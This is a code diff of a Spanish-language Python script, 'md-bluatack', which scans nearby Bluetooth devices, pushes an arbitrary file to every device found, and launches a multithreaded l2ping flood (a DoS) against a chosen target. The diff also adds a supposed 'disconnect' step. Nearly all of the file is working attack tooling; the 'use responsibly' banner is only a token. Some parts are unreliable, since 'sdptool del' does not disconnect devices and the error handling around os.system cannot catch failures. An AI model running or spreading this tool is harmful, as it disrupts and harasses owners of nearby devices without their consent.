@@ -2,119 +2,156 @@ import os
 import subprocess
 import threading
 import time
+import logging
+from datetime import datetime
 
-# Función para verificar e instalar programas necesarios
-def check_and_install_programs(programs):
-    print("[*] Verificando programas necesarios...")
-    for program in programs:
-        result = subprocess.run(['which', program], capture_output=True, text=True)
-        if result.returncode != 0:
-            print(f"[!] {program} no está instalado. Instalando {program}...")
-            os.system(f'sudo apt-get install -y {program}')
+# Configuración de logging para generar un archivo de registro
+logging.basicConfig(filename='audit_log.txt', level=logging.INFO, format='%(asctime)s - %(message)s')
+
+# Validación e instalación de herramientas necesarias
+def check_installation():
+    tools = ['hcitool', 'l2ping', 'sdptool']
+    for tool in tools:
+        if subprocess.call(['which', tool], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
+            print(f"Instalando {tool}...")
+            os.system(f"sudo apt-get install {tool} -y")
+            print(f"{tool} instalado correctamente.")
         else:
-            print(f"[*] {program} ya está instalado.")
+            print(f"{tool} ya está instalado.")
+    print("Todas las herramientas necesarias están instaladas.\n")
 
-# Función para validar si el servicio Bluetooth y SDP están activos
-def check_and_activate_bluetooth_services():
-    print("[*] Verificando servicios de Bluetooth y SDP...")
-    try:
-        # Verificar si el servicio Bluetooth está activo
-        bluetooth_status = subprocess.run(['hciconfig', 'hci0', 'up'], capture_output=True)
-        if bluetooth_status.returncode != 0:
-            print("[!] El servicio Bluetooth está inactivo. Activando...")
-            os.system('sudo hciconfig hci0 up')
-        else:
-            print("[*] El servicio Bluetooth está activo.")
-
-        # Verificar si el servidor SDP está activo
-        sdp_status = subprocess.run(['sdptool', 'browse', 'local'], capture_output=True)
-        if sdp_status.returncode != 0:
-            print("[!] El servidor SDP no está activo. Activando...")
-            os.system('sudo systemctl restart bluetooth')
-        else:
-            print("[*] El servidor SDP está activo.")
-    
-    except Exception as e:
-        print(f"[!] Error al verificar los servicios: {e}")
-        exit(1)
-
-# Función para el ataque DOS
-def DOS(target_addr, package_size):
-    os.system(f'l2ping -i hci0 -s {package_size} -f {target_addr}')
-
-# Función para mostrar el banner del programa
+# Banner del programa
 def print_banner():
-    print("============================================")
-    print("          md-attack-bluetooth")
-    print("      Creado por midesmis - Use responsablemente")
-    print("  Debe utilizarse en entornos controlados")
-    print("============================================")
+    print("**********************************************************")
+    print("*                   Creado por midesmis                  *")
+    print("*                  md-bluatack v1.0                      *")
+    print("*     Úsese con responsabilidad en entornos controlados  *")
+    print("**********************************************************")
 
-# Función principal del programa
+# Escaneo de dispositivos Bluetooth cercanos
+def scan_devices():
+    print("Escaneando dispositivos Bluetooth cercanos...")
+    try:
+        output = subprocess.check_output("sudo hcitool scan", shell=True, text=True)
+        lines = output.strip().splitlines()[1:]
+        devices = {i: line.split()[0] for i, line in enumerate(lines)}
+        for idx, line in enumerate(lines):
+            print(f"|{idx}| {line}")
+        return devices
+    except subprocess.CalledProcessError:
+        print("[!] Error durante el escaneo.")
+        return {}
+
+# Obtener información detallada del dispositivo seleccionado
+def device_info(mac_address):
+    print(f"Obteniendo información del dispositivo {mac_address}...")
+    try:
+        output = subprocess.check_output(f"sudo sdptool browse {mac_address}", shell=True, text=True)
+        print(output)
+        return output
+    except subprocess.CalledProcessError:
+        print("[!] No se pudo obtener la información del dispositivo.")
+        return None
+
+# Enviar un archivo (audio o imagen) a los dispositivos cercanos
+def send_file(devices, file_path):
+    print(f"Enviando archivo {file_path} a todos los dispositivos...")
+    for mac in devices.values():
+        try:
+            os.system(f"sudo obexftp --nopath --noconn --uuid none --bluetooth {mac} --channel 9 --put {file_path}")
+            print(f"[+] Archivo enviado a {mac}")
+        except subprocess.CalledProcessError:
+            print(f"[-] No se pudo enviar el archivo a {mac}")
+
+# Ataque DoS (Denegación de servicio) al dispositivo seleccionado
+def attack_dos(mac_address, package_size=600, threads_count=5):
+    def dos(mac_address, package_size):
+        os.system(f"sudo l2ping -i hci0 -s {package_size} -f {mac_address}")
+
+    print(f"Iniciando ataque DoS al dispositivo {mac_address}...")
+    threads = []
+    for _ in range(threads_count):
+        t = threading.Thread(target=dos, args=(mac_address, package_size))
+        threads.append(t)
+        t.start()
+
+    for t in threads:
+        t.join()
+
+# Desconectar dispositivos conectados
+def disconnect_devices(mac_address):
+    print(f"Desconectando dispositivos del {mac_address}...")
+    try:
+        os.system(f"sudo sdptool del {mac_address}")
+        print(f"[+] Dispositivos desconectados de {mac_address}")
+    except subprocess.CalledProcessError:
+        print(f"[-] No se pudo desconectar los dispositivos del {mac_address}")
+
+# Validar que el servicio de Bluetooth esté activado y activarlo si no lo está
+def check_bluetooth_service():
+    output = subprocess.getoutput("sudo service bluetooth status")
+    if "inactive" in output:
+        print("El servicio Bluetooth está desactivado. Activándolo...")
+        os.system("sudo service bluetooth start")
+    else:
+        print("El servicio Bluetooth ya está activado.")
+
+# Función principal que ejecuta todas las opciones
 def main():
+    # Validar e instalar herramientas necesarias
+    check_installation()
+
+    # Validar el estado del servicio Bluetooth
+    check_bluetooth_service()
+
+    # Mostrar banner
     print_banner()
 
-    # Lista de programas necesarios
-    required_programs = ['hcitool', 'l2ping', 'sdptool', 'bluetoothctl']
-    
-    # Verificar e instalar los programas necesarios
-    check_and_install_programs(required_programs)
-    
-    # Validar e iniciar los servicios de Bluetooth y SDP
-    check_and_activate_bluetooth_services()
-    
-    # Escaneo de dispositivos cercanos
-    print("Escaneando dispositivos Bluetooth cercanos...")
-    output = subprocess.check_output("hcitool scan", shell=True, text=True)
-    lines = output.splitlines()[1:]  # Omitir la primera línea
-    devices = {}
-    for idx, line in enumerate(lines):
-        parts = line.split()
-        devices[idx] = {'mac': parts[0], 'name': ' '.join(parts[1:])}
-        print(f"{idx}. MAC: {parts[0]}, Nombre: {' '.join(parts[1:])}")
-
+    # Escanear dispositivos Bluetooth
+    devices = scan_devices()
     if not devices:
-        print("[!] No se encontraron dispositivos.")
+        print("No se encontraron dispositivos Bluetooth.")
         return
 
-    # Selección del dispositivo por ID
-    target_id = input("Seleccione el ID del dispositivo para el ataque: ")
+    # Seleccionar dispositivo para auditar
     try:
-        target_device = devices[int(target_id)]
-        target_addr = target_device['mac']
-        print(f"[*] Dispositivo seleccionado: {target_device['name']} ({target_addr})")
-    except (KeyError, ValueError):
-        print("[!] ID inválido.")
+        target_id = int(input("Introduce el ID del dispositivo para auditar > "))
+        target_mac = devices[target_id]
+    except (ValueError, KeyError):
+        print("[!] Selección inválida.")
         return
 
-    # Opción para enviar imagen o audio antes del ataque
-    send_media = input("¿Desea enviar una imagen o audio antes del ataque? (y/n): ").lower()
-    if send_media == 'y':
-        media_file = input("Ingrese la ruta del archivo de imagen o audio a enviar: ")
-        # Suponiendo que usas l2cap para enviar datos
-        print(f"[*] Enviando {media_file} a {target_addr}...")
-        os.system(f"l2ping -i hci0 -s 600 -f {target_addr}")  # Simulando el envío
-    
-    # Configurar el ataque DOS
-    package_size = int(input("Ingrese el tamaño del paquete para el ataque DOS: "))
-    threads_count = int(input("Ingrese la cantidad de hilos para el ataque DOS: "))
+    # Obtener información del dispositivo
+    device_info(target_mac)
 
-    print("[*] Iniciando ataque DOS en 3 segundos...")
-    time.sleep(3)
+    # Enviar archivo a dispositivos cercanos
+    file_path = input("Introduce la ruta del archivo a enviar (imagen o audio) > ")
+    send_file(devices, file_path)
 
-    # Iniciar el ataque DOS
-    for i in range(threads_count):
-        threading.Thread(target=DOS, args=(target_addr, package_size)).start()
+    # Elegir el ataque a realizar
+    print("\nOpciones de ataque:")
+    print("1. Ataque DoS")
+    print("2. Desconectar dispositivos conectados")
+    choice = input("Elige una opción (1/2) > ")
 
-    print("[*] Ataque DOS en ejecución...")
+    if choice == '1':
+        package_size = int(input("Introduce el tamaño del paquete para el ataque DoS > "))
+        threads_count = int(input("Introduce la cantidad de hilos > "))
+        attack_dos(target_mac, package_size, threads_count)
+    elif choice == '2':
+        disconnect_devices(target_mac)
+    else:
+        print("[!] Opción no válida.")
 
-    # Estado de salida exitoso
-    print("[*] Saliendo del programa exitosamente.")
-    exit(0)
+    # Mensaje de salida
+    print("\nSaliendo del programa...")
+    logging.info(f"Auditoría finalizada en {datetime.now()}")
 
-if __name__ == "__main__":
+
+if __name__ == '__main__':
     try:
         main()
     except KeyboardInterrupt:
-        print("\n[!] Programa abortado.")
-        exit(0)
+        print("\n[!] Programa interrumpido por el usuario.")
+    except Exception as e:
+        print(f"[!] Error inesperado: {str(e)}")
